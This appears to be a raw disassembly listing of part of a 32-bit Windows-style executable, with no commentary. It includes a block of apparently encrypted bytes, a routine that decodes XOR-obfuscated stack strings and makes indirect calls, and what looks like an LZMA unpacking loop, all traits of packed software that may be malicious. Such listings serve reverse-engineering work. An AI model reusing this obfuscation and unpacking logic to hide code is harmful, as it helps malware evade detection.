  41aa72:	xchg   ebp,eax
  41aa73:	pushf  
  41aa74:	daa    
  41aa75:	inc    DWORD PTR [eax+0x5a]
  41aa78:	mov    eax,ds:0x4cc61011
  41aa7d:	pop    esp
  41aa7e:	sbb    edx,DWORD PTR [ebx]
  41aa80:	js     0x41aaa0
  41aa82:	lds    ecx,FWORD PTR [edi]
  41aa84:	mov    dl,0x85
  41aa86:	sub    BYTE PTR [ebx-0x6ee4b01a],bh
  41aa8c:	ret    0xe67c
  41aa8f:	idiv   BYTE PTR [bx+di+0x1235]
  41aa94:	std    
  41aa95:	jb     0x41aae9
  41aa97:	fs and al,0xce
  41aa9a:	std    
  41aa9b:	fadd   st,st(3)
  41aa9d:	aaa    
  41aa9e:	jae    0x41aab3
  41aaa0:	mov    esp,0x9825e0a1
  41aaa5:	push   cs
  41aaa6:	out    0x35,al
  41aaa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaa9:	xchg   edx,eax
  41aaaa:	dec    ebp
  41aaab:	or     ebp,esi
  41aaad:	dec    edx
  41aaae:	sub    esp,esi
  41aab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aab1:	inc    ebx
  41aab2:	sbb    DWORD PTR [ecx+0x6feaf651],ecx
  41aab8:	push   esp
  41aab9:	ins    DWORD PTR es:[edi],dx
  41aaba:	mov    ds:0xaa970fea,eax
  41aabf:	push   ecx
  41aac0:	mov    DWORD PTR [edi],ecx
  41aac2:	adc    eax,0xcf66163f
  41aac7:	pop    ds
  41aac8:	(bad)  
  41aacb:	sar    al,cl
  41aacd:	and    esi,DWORD PTR [esi-0x3a]
  41aad0:	dec    eax
  41aad1:	mov    ch,0x96
  41aad3:	xchg   ebp,eax
  41aad4:	cld    
  41aad5:	add    DWORD PTR [ecx],eax
  41aad7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aad8:	scas   eax,DWORD PTR es:[edi]
  41aad9:	repnz xor al,0xfb
  41aadc:	jb     0x41aaeb
  41aade:	ins    DWORD PTR es:[edi],dx
  41aadf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aae0:	xor    BYTE PTR [esi-0x4eab8c85],dh
  41aae6:	stc    
  41aae7:	add    DWORD PTR [ecx-0x43],0xa
  41aaeb:	stos   DWORD PTR es:[edi],eax
  41aaec:	(bad)  
  41aaef:	outs   dx,BYTE PTR ds:[esi]
  41aaf0:	cmp    DWORD PTR [edi],esp
  41aaf2:	call   0xd2ed4ead
  41aaf7:	xchg   BYTE PTR [esi],ch
  41aaf9:	je     0x41ab3d
  41aafb:	and    eax,0x78fba102
  41ab00:	fsub   DWORD PTR [ebp+0x7c994c18]
  41ab06:	int3   
  41ab07:	adc    ecx,DWORD PTR [eax+0x26]
  41ab0a:	push   es
  41ab0b:	cmc    
  41ab0c:	xchg   esi,eax
  41ab0d:	dec    ecx
  41ab0e:	mov    dl,0x23
  41ab10:	mov    ds:0xc024166d,eax
  41ab15:	mov    edi,0x6e92518f
  41ab1a:	mov    al,ds:0x3b20e0aa
  41ab1f:	es imul ecx,edx,0x6a
  41ab23:	test   eax,0xd459b3ab
  41ab28:	xor    al,0xa0
  41ab2a:	cs mov dl,0x91
  41ab2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab2e:	inc    DWORD PTR [ecx+0x2b]
  41ab31:	mov    edx,0x10218f7
  41ab36:	jmp    0x20de:0xdfb16056
  41ab3d:	outs   dx,BYTE PTR ds:[esi]
  41ab3e:	stc    
  41ab3f:	adc    eax,DWORD PTR [esi+0x4c40357f]
  41ab45:	xchg   ch,ch
  41ab47:	clc    
  41ab48:	push   ebp
  41ab49:	adc    ah,BYTE PTR [ecx-0x9]
  41ab4c:	mov    edi,0x666ba8a8
  41ab51:	test   BYTE PTR ds:0x8150a183,ah
  41ab57:	sar    eax,0x8
  41ab5a:	push   edi
  41ab5b:	add    BYTE PTR [edi],cl
  41ab5d:	scas   eax,DWORD PTR es:[edi]
  41ab5e:	retf   0x4d89
  41ab61:	test   al,0x8b
  41ab63:	dec    ebp
  41ab64:	or     BYTE PTR [ebx-0x3e7e53ab],cl
  41ab6a:	(bad)  
  41ab6c:	add    BYTE PTR fs:[ebx],cl
  41ab6f:	retf   0x4d89
  41ab72:	lods   al,BYTE PTR ds:[esi]
  41ab73:	mov    ecx,DWORD PTR [ebp+0x8]
  41ab76:	mov    edx,DWORD PTR [ebp-0x50]
  41ab79:	add    ecx,0x242ebed
  41ab7f:	xor    ecx,edx
  41ab81:	mov    DWORD PTR [ebp-0x50],ecx
  41ab84:	mov    ecx,DWORD PTR [ebp+0x8]
  41ab87:	mov    edx,DWORD PTR [ebp-0x4c]
  41ab8a:	add    ecx,edi
  41ab8c:	and    ecx,edx
  41ab8e:	mov    DWORD PTR [ebp-0x4c],ecx
  41ab91:	mov    ecx,DWORD PTR [ebp+0x8]
  41ab94:	mov    edx,DWORD PTR [ebp-0x48]
  41ab97:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41ab9e:	mov    DWORD PTR [ebp-0x48],ecx
  41aba1:	mov    ecx,DWORD PTR [ebp+0x8]
  41aba4:	mov    edx,0xfa5e15e2
  41aba9:	sub    edx,ecx
  41abab:	add    edx,DWORD PTR [ebp-0x44]
  41abae:	mov    DWORD PTR [ebp-0x44],edx
  41abb1:	mov    ecx,DWORD PTR [ebp+0x8]
  41abb4:	xor    ecx,eax
  41abb6:	add    ecx,esi
  41abb8:	jne    0x4187b7
  41abbe:	mov    ecx,DWORD PTR [ebp-0x8]
  41abc1:	xor    ecx,eax
  41abc3:	mov    eax,DWORD PTR [ebp+0x10]
  41abc6:	add    ecx,esi
  41abc8:	mov    DWORD PTR [eax],ecx
  41abca:	pop    edi
  41abcb:	pop    esi
  41abcc:	pop    ebx
  41abcd:	leave  
  41abce:	ret    0xc
  41abd1:	add    BYTE PTR [eax-0x5ffbffbe],ah
  41abd7:	inc    edx
  41abd8:	add    BYTE PTR [eax],cl
  41abda:	mov    al,ds:0xa00c0042
  41abdf:	inc    edx
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    al,ds:0xa0140042
  41abe7:	inc    edx
  41abe8:	add    BYTE PTR [eax],bl
  41abea:	mov    al,ds:0xa01c0042
  41abef:	inc    edx
  41abf0:	add    BYTE PTR [eax],al
  41abf2:	rol    BYTE PTR [edx+0x0],1
  41abf5:	add    al,0xd0
  41abf7:	inc    edx
  41abf8:	add    BYTE PTR [eax],cl
  41abfa:	rol    BYTE PTR [edx+0x0],1
  41abfd:	or     al,0xd0
  41abff:	inc    edx
  41ac00:	add    BYTE PTR [eax],dl
  41ac02:	rol    BYTE PTR [edx+0x0],1
  41ac05:	adc    al,0xd0
  41ac07:	inc    edx
  41ac08:	add    BYTE PTR [eax],bl
  41ac0a:	rol    BYTE PTR [edx+0x0],1
  41ac0d:	sbb    al,0xd0
  41ac0f:	inc    edx
	...
  41ac24:	scas   al,BYTE PTR es:[edi]
  41ac25:	pop    esp
  41ac26:	nop
  41ac27:	dec    ebp
  41ac28:	add    BYTE PTR [eax],al
  41ac2a:	add    BYTE PTR [eax],al
  41ac2c:	add    al,BYTE PTR [eax]
  41ac2e:	add    BYTE PTR [eax],al
  41ac30:	cmp    eax,0xb0000000
  41ac35:	lods   al,BYTE PTR ds:[esi]
  41ac36:	add    DWORD PTR [eax],eax
  41ac38:	mov    al,0xa0
  41ac3a:	add    DWORD PTR [eax],eax
  41ac3c:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41ac42:	inc    edx
  41ac43:	add    BYTE PTR [eax],cl
  41ac45:	nop
  41ac46:	inc    edx
  41ac47:	add    BYTE PTR [eax+edx*4],cl
  41ac4a:	inc    edx
  41ac4b:	add    BYTE PTR [eax],dl
  41ac4d:	nop
  41ac4e:	inc    edx
  41ac4f:	add    BYTE PTR [eax+edx*4],dl
  41ac52:	inc    edx
  41ac53:	add    BYTE PTR [eax],bl
  41ac55:	nop
  41ac56:	inc    edx
  41ac57:	add    BYTE PTR [eax+edx*4],bl
  41ac5a:	inc    edx
  41ac5b:	add    BYTE PTR [eax],ah
  41ac5d:	nop
  41ac5e:	inc    edx
  41ac5f:	add    BYTE PTR [eax+edx*4],ah
  41ac62:	inc    edx
  41ac63:	add    BYTE PTR [eax],ch
  41ac65:	nop
  41ac66:	inc    edx
  41ac67:	add    BYTE PTR [eax],al
  41ac69:	mov    al,0x42
  41ac6b:	add    BYTE PTR [eax+esi*4],al
  41ac6e:	inc    edx
  41ac6f:	add    BYTE PTR [eax],cl
  41ac71:	mov    al,0x42
  41ac73:	add    BYTE PTR [eax+esi*4],cl
  41ac76:	inc    edx
  41ac77:	add    BYTE PTR [eax],dl
  41ac79:	mov    al,0x42
  41ac7b:	add    BYTE PTR [eax+esi*4],dl
  41ac7e:	inc    edx
  41ac7f:	add    BYTE PTR [eax],bl
  41ac81:	mov    al,0x42
  41ac83:	add    BYTE PTR [eax+esi*4],bl
  41ac86:	inc    edx
  41ac87:	add    BYTE PTR [eax],al
  41ac89:	rol    BYTE PTR [edx+0x0],0x4
  41ac8d:	rol    BYTE PTR [edx+0x0],0x8
  41ac91:	rol    BYTE PTR [edx+0x0],0xc
  41ac95:	rol    BYTE PTR [edx+0x0],0x10
  41ac99:	rol    BYTE PTR [edx+0x0],0x14
  41ac9d:	rol    BYTE PTR [edx+0x0],0x18
  41aca1:	rol    BYTE PTR [edx+0x0],0x1c
  41aca5:	rol    BYTE PTR [edx+0x0],0x0
  41aca9:	add    BYTE PTR [eax],al
  41acab:	add    BYTE PTR [eax],al
  41acad:	add    BYTE PTR [eax],al
  41acaf:	add    BYTE PTR [edx+0x53],dl
  41acb2:	inc    esp
  41acb3:	push   ebx
  41acb4:	scas   eax,DWORD PTR es:[edi]
  41acb5:	push   ecx
  41acb6:	inc    eax
  41acb7:	jle    0x41acba
  41acb9:	xchg   ebx,eax
  41acba:	ror    BYTE PTR [ecx-0x79],1
  41acbd:	sbb    eax,0xf32c5e24
  41acc2:	lods   eax,DWORD PTR ds:[esi]
  41acc3:	push   ebp
  41acc4:	add    DWORD PTR [eax],eax
  41acc6:	add    BYTE PTR [eax],al
  41acc8:	inc    ebx
  41acc9:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  41accd:	jb     0x41ad41
  41accf:	outs   dx,BYTE PTR gs:[esi]
  41acd1:	je     0x41ad17
  41acd3:	popa   
  41acd4:	je     0x41ad37
  41acd6:	pop    esp
  41acd7:	dec    ebp
  41acd8:	outs   dx,DWORD PTR ds:[esi]
  41acd9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  41ace1:	ins    BYTE PTR es:[edi],dx
  41ace2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  41ace9:	dec    esi
  41acea:	gs ja  0x41aced
  41aced:	mov    edx,DWORD PTR [ebp-0x14]
  41acf0:	sub    esp,0xe4
  41acf6:	push   ebx
  41acf7:	push   edi
  41acf8:	mov    eax,ebx
  41acfa:	xchg   ecx,eax
  41acfb:	mov    eax,DWORD PTR [ebp+0x8]
  41acfe:	mov    edi,0xf89c85b9
  41ad03:	cmp    eax,edi
  41ad05:	jne    0x41b0a1
  41ad0b:	mov    eax,DWORD PTR [ebp+0xc]
  41ad0e:	cmp    eax,0xf89c85b8
  41ad13:	jne    0x41b0a1
  41ad19:	mov    eax,DWORD PTR [ebp+0x24]
  41ad1c:	mov    DWORD PTR [ebp-0x4],eax
  41ad1f:	mov    BYTE PTR [ebp-0x18],0x3
  41ad23:	mov    BYTE PTR [ebp-0x17],0x1e
  41ad27:	mov    BYTE PTR [ebp-0x16],0x1
  41ad2b:	mov    BYTE PTR [ebp-0x15],0x4f
  41ad2f:	mov    BYTE PTR [ebp-0x14],0x48
  41ad33:	mov    BYTE PTR [ebp-0x13],0x7a
  41ad37:	mov    BYTE PTR [ebp-0x20],0xd
  41ad3b:	mov    BYTE PTR [ebp-0x1f],0xf
  41ad3f:	mov    BYTE PTR [ebp-0x1e],0x1d
  41ad43:	mov    BYTE PTR [ebp-0x1d],0x8
  41ad47:	mov    BYTE PTR [ebp-0x1c],0x4f
  41ad4b:	mov    BYTE PTR [ebp-0x1b],0x48
  41ad4f:	mov    BYTE PTR [ebp-0x1a],0x7a
  41ad53:	mov    BYTE PTR [ebp-0x28],0xf
  41ad57:	mov    BYTE PTR [ebp-0x27],0x2
  41ad5b:	mov    BYTE PTR [ebp-0x26],0x6
  41ad5f:	mov    BYTE PTR [ebp-0x25],0xf3
  41ad63:	mov    BYTE PTR [ebp-0x24],0x19
  41ad67:	mov    BYTE PTR [ebp-0x23],0xa
  41ad6b:	push   esi
  41ad6c:	mov    BYTE PTR [ebp-0x22],0x1
  41ad70:	xor    edx,edx
  41ad72:	mov    BYTE PTR [ebp-0x21],0x7a
  41ad76:	xor    esi,esi
  41ad78:	mov    eax,0xf7
  41ad7d:	lea    ecx,[ebp+esi*1-0x18]
  41ad81:	movzx  ebx,BYTE PTR [ecx]
  41ad84:	xor    ebx,0x73
  41ad87:	add    ebx,eax
  41ad89:	inc    esi
  41ad8a:	mov    BYTE PTR [ecx],bl
  41ad8c:	cmp    esi,0x6
  41ad8f:	jb     0x41ad7d
  41ad91:	xor    esi,esi
  41ad93:	lea    ecx,[ebp+esi*1-0x20]
  41ad97:	movzx  ebx,BYTE PTR [ecx]
  41ad9a:	xor    ebx,0x73
  41ad9d:	add    ebx,eax
  41ad9f:	inc    esi
  41ada0:	mov    BYTE PTR [ecx],bl
  41ada2:	cmp    esi,0x7
  41ada5:	jb     0x41ad93
  41ada7:	xor    esi,esi
  41ada9:	lea    ecx,[ebp+esi*1-0x28]
  41adad:	movzx  ebx,BYTE PTR [ecx]
  41adb0:	xor    ebx,0x73
  41adb3:	add    ebx,eax
  41adb5:	inc    esi
  41adb6:	mov    BYTE PTR [ecx],bl
  41adb8:	cmp    esi,0x8
  41adbb:	jb     0x41ada9
  41adbd:	lea    eax,[ebp-0x2c]
  41adc0:	mov    DWORD PTR [ebp-0x8],eax
  41adc3:	mov    ecx,DWORD PTR [ebp-0x8]
  41adc6:	mov    eax,0x7113fcef
  41adcb:	mov    DWORD PTR [ecx],eax
  41adcd:	mov    ecx,DWORD PTR [ebp-0x2c]
  41add0:	cmp    ecx,eax
  41add2:	jne    0x41adde
  41add4:	mov    DWORD PTR [ebp-0x8],edi
  41add7:	mov    DWORD PTR [ebp-0x8],0xf89c85ea
  41adde:	mov    eax,DWORD PTR [ebp-0x4]
  41ade1:	mov    eax,DWORD PTR [eax+0x18c]
  41ade7:	mov    ebx,0x7510899
  41adec:	mov    esi,0x3272e0
  41adf1:	cmp    DWORD PTR [eax],edx
  41adf3:	jne    0x41b03d
  41adf9:	mov    eax,DWORD PTR [ebp-0x4]
  41adfc:	mov    eax,DWORD PTR [eax+0x17c]
  41ae02:	mov    DWORD PTR [eax],edx
  41ae04:	mov    eax,DWORD PTR [ebp-0x4]
  41ae07:	mov    eax,DWORD PTR [eax+0x180]
  41ae0d:	mov    DWORD PTR [eax],edx
  41ae0f:	mov    edi,0x4e3c
  41ae14:	mov    eax,0x4f8f
  41ae19:	mov    WORD PTR [ebp-0x78],ax
  41ae1d:	mov    eax,edi
  41ae1f:	mov    WORD PTR [ebp-0x76],ax
  41ae23:	add    eax,0x43
  41ae26:	mov    WORD PTR [ebp-0x74],ax
  41ae2a:	lea    eax,[edi+0x3]
  41ae2d:	mov    WORD PTR [ebp-0x72],ax
  41ae31:	mov    eax,0x4fac
  41ae36:	mov    WORD PTR [ebp-0x70],ax
  41ae3a:	lea    eax,[edi-0x4]
  41ae3d:	mov    WORD PTR [ebp-0x6e],ax
  41ae41:	add    eax,0x45
  41ae44:	mov    WORD PTR [ebp-0x6c],ax
  41ae48:	lea    eax,[edi-0x2]
  41ae4b:	mov    WORD PTR [ebp-0x6a],ax
  41ae4f:	mov    eax,edi
  41ae51:	mov    WORD PTR [ebp-0x68],ax
  41ae55:	dec    eax
  41ae56:	mov    WORD PTR [ebp-0x66],ax
  41ae5a:	mov    eax,0x99ff
  41ae5f:	mov    WORD PTR [ebp-0x64],ax
  41ae63:	mov    eax,0x8288
  41ae68:	mov    WORD PTR [ebp-0x62],ax
  41ae6c:	mov    eax,0xd78d
  41ae71:	mov    WORD PTR [ebp-0x60],ax
  41ae75:	add    eax,0x1c
  41ae78:	mov    WORD PTR [ebp-0x5e],ax
  41ae7c:	mov    eax,0x27aa
  41ae81:	mov    WORD PTR [ebp-0x5c],ax
  41ae85:	mov    eax,0x47aa
  41ae8a:	mov    WORD PTR [ebp-0x5a],ax
  41ae8e:	lea    eax,[edi-0x3]
  41ae91:	push   0x8
  41ae93:	mov    WORD PTR [ebp-0x58],ax
  41ae97:	mov    DWORD PTR [ebp-0x10],0xf306020f
  41ae9e:	mov    DWORD PTR [ebp-0xc],0x7a010a19
  41aea5:	lea    eax,[ebp-0x10]
  41aea8:	pop    ecx
  41aea9:	mov    dl,BYTE PTR [eax]
  41aeab:	xor    dl,0x73
  41aeae:	sub    dl,0x9
  41aeb1:	mov    BYTE PTR [eax],dl
  41aeb3:	inc    eax
  41aeb4:	dec    ecx
  41aeb5:	jne    0x41aea9
  41aeb7:	lea    eax,[ebp-0x10]
  41aeba:	mov    DWORD PTR [ebp-0xb8],eax
  41aec0:	lea    eax,[ebp-0xbc]
  41aec6:	push   eax
  41aec7:	mov    eax,DWORD PTR [ebp+0xc]
  41aeca:	xor    eax,ebx
  41aecc:	add    eax,esi
  41aece:	push   eax
  41aecf:	mov    eax,DWORD PTR [ebp-0x4]
  41aed2:	add    eax,0x66
  41aed5:	push   eax
  41aed6:	mov    eax,DWORD PTR [ebp-0x4]
  41aed9:	mov    eax,DWORD PTR [eax+0x198]
  41aedf:	mov    DWORD PTR [ebp-0xbc],0x1
  41aee9:	push   DWORD PTR [eax]
  41aeeb:	mov    eax,DWORD PTR [ebp+0x10]
  41aeee:	call   eax
  41aef0:	mov    ecx,DWORD PTR [ebp+0x8]
  41aef3:	xor    ecx,ebx
  41aef5:	add    ecx,esi
  41aef7:	mov    DWORD PTR [ebp-0x8],eax
  41aefa:	cmp    eax,ecx
  41aefc:	jne    0x41af17
  41aefe:	mov    eax,ds:0x33730bee
  41af03:	or     eax,0x22150bef
  41af08:	mov    ds:0x33730bee,eax
  41af0d:	add    eax,0x3372e90f
  41af12:	mov    ds:0x33730bee,eax
  41af17:	mov    ecx,0x4f84
  41af1c:	mov    eax,ecx
  41af1e:	mov    WORD PTR [ebp-0x40],ax
  41af22:	mov    eax,0x4e71
  41af27:	mov    edx,eax
  41af29:	mov    WORD PTR [ebp-0x3e],dx
  41af2d:	lea    edx,[ecx+0x15]
  41af30:	mov    WORD PTR [ebp-0x3c],dx
  41af34:	add    edx,0xfffffff8
  41af37:	mov    WORD PTR [ebp-0x3a],dx
  41af3b:	lea    edx,[ecx+0xf]
  41af3e:	mov    WORD PTR [ebp-0x38],dx
  41af42:	add    edx,0x1b
  41af45:	mov    WORD PTR [ebp-0x36],dx
  41af49:	lea    edx,[ecx+0x21]
  41af4c:	mov    WORD PTR [ebp-0x34],dx
  41af50:	mov    WORD PTR [ebp-0x32],cx
  41af54:	mov    ecx,edi
  41af56:	mov    WORD PTR [ebp-0x30],cx
  41af5a:	lea    ecx,[edx-0x1]
  41af5d:	mov    edx,ecx
  41af5f:	mov    WORD PTR [ebp-0x54],dx
  41af63:	mov    edx,eax
  41af65:	mov    WORD PTR [ebp-0x52],dx
  41af69:	add    edx,0x8
  41af6c:	mov    WORD PTR [ebp-0x50],dx
  41af70:	mov    WORD PTR [ebp-0x4e],ax
  41af74:	add    eax,0x2
  41af77:	mov    WORD PTR [ebp-0x4c],ax
  41af7b:	lea    eax,[ecx-0x16]
  41af7e:	mov    WORD PTR [ebp-0x4a],ax
  41af82:	add    eax,0xfffffff7
  41af85:	mov    WORD PTR [ebp-0x48],ax
  41af89:	mov    WORD PTR [ebp-0x46],cx
  41af8d:	mov    WORD PTR [ebp-0x44],di
  41af91:	mov    eax,DWORD PTR [ebp+0x8]
  41af94:	movzx  ecx,WORD PTR [ebp-0x54]
  41af98:	xor    eax,ebx
  41af9a:	add    eax,esi
  41af9c:	xor    eax,ecx
  41af9e:	mov    WORD PTR [ebp-0x54],ax
  41afa2:	mov    eax,DWORD PTR [ebp+0x8]
  41afa5:	movzx  ecx,WORD PTR [ebp-0x40]
  41afa9:	xor    eax,ebx
  41afab:	add    eax,esi
  41afad:	xor    eax,ecx
  41afaf:	mov    WORD PTR [ebp-0x40],ax
  41afb3:	xor    eax,eax
  41afb5:	mov    WORD PTR [ebp-0xd0],ax
  41afbc:	mov    WORD PTR [ebp-0xe4],ax
  41afc3:	mov    edi,DWORD PTR [ebp+0x24]
  41afc6:	lea    eax,[ebp-0xd0]
  41afcc:	lea    edx,[ebp-0x54]
  41afcf:	mov    DWORD PTR [ebp-0xbc],0x2
  41afd9:	mov    DWORD PTR [ebp-0xb8],eax
  41afdf:	call   0x41d97e
  41afe4:	mov    DWORD PTR [ebp-0xb4],eax
  41afea:	lea    eax,[ebp-0xbc]
  41aff0:	push   eax
  41aff1:	mov    eax,DWORD PTR [ebp+0xc]
  41aff4:	xor    eax,ebx
  41aff6:	add    eax,esi
  41aff8:	push   eax
  41aff9:	lea    eax,[ebp-0x78]
  41affc:	push   eax
  41affd:	push   DWORD PTR [ebp-0x8]
  41b000:	mov    eax,DWORD PTR [ebp+0x10]
  41b003:	call   eax
  41b005:	mov    edi,DWORD PTR [ebp+0x24]
  41b008:	lea    eax,[ebp-0xe4]
  41b00e:	lea    edx,[ebp-0x40]
  41b011:	mov    DWORD PTR [ebp-0xb8],eax
  41b017:	call   0x41d97e
  41b01c:	mov    DWORD PTR [ebp-0xb4],eax
  41b022:	lea    eax,[ebp-0xbc]
  41b028:	push   eax
  41b029:	mov    eax,DWORD PTR [ebp+0xc]
  41b02c:	xor    eax,ebx
  41b02e:	add    eax,esi
  41b030:	push   eax
  41b031:	lea    eax,[ebp-0x78]
  41b034:	push   eax
  41b035:	push   DWORD PTR [ebp-0x8]
  41b038:	mov    eax,DWORD PTR [ebp+0x10]
  41b03b:	call   eax
  41b03d:	mov    eax,DWORD PTR [ebp+0x14]
  41b040:	push   DWORD PTR [ebp-0x4]
  41b043:	push   DWORD PTR [ebp+0x20]
  41b046:	push   DWORD PTR [ebp+0x1c]
  41b049:	push   DWORD PTR [ebp+0x18]
  41b04c:	push   DWORD PTR [ebp+0x10]
  41b04f:	push   DWORD PTR [ebp+0x8]
  41b052:	push   DWORD PTR [ebp+0xc]
  41b055:	call   0x41c1fa
  41b05a:	test   eax,eax
  41b05c:	je     0x41b0a0
  41b05e:	add    DWORD PTR [ebp-0x4],eax
  41b061:	push   DWORD PTR [ebp-0x4]
  41b064:	lea    edi,[ebp+0x4]
  41b067:	call   0x41b490
  41b06c:	mov    eax,DWORD PTR [ebp-0x4]
  41b06f:	mov    eax,DWORD PTR [eax+0x1c8]
  41b075:	mov    eax,DWORD PTR [eax]
  41b077:	xor    eax,ebx
  41b079:	add    eax,esi
  41b07b:	mov    eax,DWORD PTR [ebp-0x4]
  41b07e:	jne    0x41b096
  41b080:	mov    ecx,DWORD PTR [ebp-0x4]
  41b083:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41b089:	push   DWORD PTR [ecx]
  41b08b:	mov    eax,DWORD PTR [eax+0x1d8]
  41b091:	call   DWORD PTR [eax+0x28]
  41b094:	jmp    0x41b0a0
  41b096:	mov    eax,DWORD PTR [eax+0x17c]
  41b09c:	mov    eax,DWORD PTR [eax]
  41b09e:	add    DWORD PTR [edi],eax
  41b0a0:	pop    esi
  41b0a1:	pop    edi
  41b0a2:	pop    ebx
  41b0a3:	leave  
  41b0a4:	ret    0x20
  41b0a7:	push   edi
  41b0a8:	push   esi
  41b0a9:	push   ebx
  41b0aa:	push   ebp
  41b0ab:	mov    ebp,esp
  41b0ad:	mov    eax,DWORD PTR [ebp+0x24]
  41b0b0:	add    DWORD PTR [ebp+0x28],eax
  41b0b3:	push   eax
  41b0b4:	cld    
  41b0b5:	mov    esi,DWORD PTR [ebp+0x18]
  41b0b8:	add    DWORD PTR [ebp+0x1c],esi
  41b0bb:	push   esi
  41b0bc:	mov    esi,DWORD PTR [ebp+0x14]
  41b0bf:	lods   eax,DWORD PTR ds:[esi]
  41b0c0:	xchg   edx,eax
  41b0c1:	push   edx
  41b0c2:	mov    cl,BYTE PTR [esi-0x2]
  41b0c5:	or     eax,0xffffffff
  41b0c8:	shl    eax,cl
  41b0ca:	not    eax
  41b0cc:	push   eax
  41b0cd:	mov    cl,dh
  41b0cf:	or     eax,0xffffffff
  41b0d2:	shl    eax,cl
  41b0d4:	not    eax
  41b0d6:	push   eax
  41b0d7:	add    cl,dl
  41b0d9:	mov    edi,esi
  41b0db:	sub    esp,0xc
  41b0de:	sub    eax,eax
  41b0e0:	inc    eax
  41b0e1:	push   eax
  41b0e2:	push   eax
  41b0e3:	push   eax
  41b0e4:	push   eax
  41b0e5:	push   eax
  41b0e6:	push   edi
  41b0e7:	sub    esi,esi
  41b0e9:	push   esi
  41b0ea:	or     ebx,0xffffffff
  41b0ed:	mov    eax,0x300
  41b0f2:	shl    eax,cl
  41b0f4:	lea    ecx,[eax+0x736]
  41b0fa:	mov    eax,0x4000400
  41b0ff:	shr    ecx,1
  41b101:	rep stos DWORD PTR es:[edi],eax
  41b103:	push   0x5
  41b105:	pop    ecx
  41b106:	call   0x41b3f1
  41b10b:	loop   0x41b106
  41b10d:	lea    esi,[esi]
  41b10f:	lea    edi,[edi]
  41b111:	mov    edi,DWORD PTR [ebp-0x4]
  41b114:	mov    eax,DWORD PTR [ebp-0x10]
  41b117:	sub    edi,DWORD PTR [ebp+0x24]
  41b11a:	and    eax,edi
  41b11c:	mov    DWORD PTR [ebp-0x18],eax
  41b11f:	mov    al,0x0
  41b121:	call   0x41b409
  41b126:	jne    0x41b1c1
  41b12c:	mov    cl,BYTE PTR [ebp-0xc]
  41b12f:	and    edi,DWORD PTR [ebp-0x14]
  41b132:	shl    edi,cl
  41b134:	sub    cl,0x8
  41b137:	neg    cl
  41b139:	shr    esi,cl
  41b13b:	pop    eax
  41b13c:	add    edi,esi
  41b13e:	pop    esi
  41b13f:	lea    edi,[edi+edi*2]
  41b142:	shl    edi,0x8
  41b145:	cmp    al,0x7
  41b147:	pop    edx
  41b148:	lea    ecx,[esi+edi*2+0xe6c]
  41b14f:	push   ecx
  41b150:	push   esi
  41b151:	mov    esi,0x100
  41b156:	push   eax
  41b157:	mov    al,0x1
  41b159:	jb     0x41b18f
  41b15b:	mov    edi,DWORD PTR [ebp-0x4]
  41b15e:	sub    edi,DWORD PTR [ebp-0x24]
  41b161:	movzx  edi,BYTE PTR [edi]
  41b164:	mov    ebp,DWORD PTR [ebp-0x34]
  41b167:	shl    edi,1
  41b169:	mov    ecx,esi
  41b16b:	and    esi,edi
  41b16d:	add    ecx,esi
  41b16f:	lea    ebp,[ebp+ecx*2+0x0]
  41b173:	call   0x41b428
  41b178:	mov    ecx,eax
  41b17a:	shr    esi,0x8
  41b17d:	and    ecx,0x1
  41b180:	cmp    esi,ecx
  41b182:	mov    esi,0x100
  41b187:	jne    0x41b197
  41b189:	cmp    eax,esi
  41b18b:	jb     0x41b164
  41b18d:	jmp    0x41b1a3
  41b18f:	mov    ebp,DWORD PTR [ebp-0x34]
  41b192:	call   0x41b428
  41b197:	inc    eax
  41b198:	inc    esi
  41b199:	sub    eax,0x1
  41b19c:	sub    esi,0x1
  41b19f:	cmp    eax,esi
  41b1a1:	jb     0x41b18f
  41b1a3:	pop    edx
  41b1a4:	inc    edx
  41b1a5:	cmp    edx,0x5
  41b1a8:	dec    edx
  41b1a9:	mov    ecx,edx
  41b1ab:	jb     0x41b1bc
  41b1ad:	inc    edx
  41b1ae:	cmp    edx,0xb
  41b1b1:	dec    edx
  41b1b2:	mov    cl,0x4
  41b1b4:	dec    cl
  41b1b6:	jb     0x41b1bc
  41b1b8:	mov    cl,0x7
  41b1ba:	dec    cl
  41b1bc:	sub    edx,ecx
  41b1be:	push   edx
  41b1bf:	jmp    0x41b210
  41b1c1:	mov    al,0xc1
  41b1c3:	dec    al
  41b1c5:	call   0x41b419
  41b1ca:	jne    0x41b1e0
  41b1cc:	pop    eax
  41b1cd:	pop    edi
  41b1ce:	pop    edx
  41b1cf:	pop    ecx
  41b1d0:	pop    edx
  41b1d1:	pop    ecx
  41b1d2:	push   DWORD PTR [esp]
  41b1d5:	push   ecx
  41b1d6:	push   edx
  41b1d7:	mov    edx,0x664
  41b1dc:	mov    cl,0x0
  41b1de:	jmp    0x41b253
  41b1e0:	mov    al,0xcd
  41b1e2:	dec    al
  41b1e4:	call   0x41b419
  41b1e9:	jne    0x41b219
  41b1eb:	mov    al,0xf1
  41b1ed:	dec    al
  41b1ef:	call   0x41b409
  41b1f4:	jne    0x41b249
  41b1f6:	pop    eax
  41b1f7:	cmp    al,0x7
  41b1f9:	mov    al,0x9
  41b1fb:	jb     0x41b1ff
  41b1fd:	mov    al,0xb
  41b1ff:	push   eax
  41b200:	mov    esi,DWORD PTR [ebp-0x4]
  41b203:	sub    esi,DWORD PTR [ebp-0x24]
  41b206:	cmp    esi,DWORD PTR [ebp+0x24]
  41b209:	jb     0x41b3e0
  41b20f:	lods   al,BYTE PTR ds:[esi]
  41b210:	mov    edi,DWORD PTR [ebp-0x4]
  41b213:	stos   BYTE PTR es:[edi],al
  41b214:	jmp    0x41b3a7
  41b219:	mov    al,0xd8
  41b21b:	call   0x41b419
  41b220:	mov    esi,DWORD PTR [ebp-0x28]
  41b223:	je     0x41b240
  41b225:	mov    al,0xe4
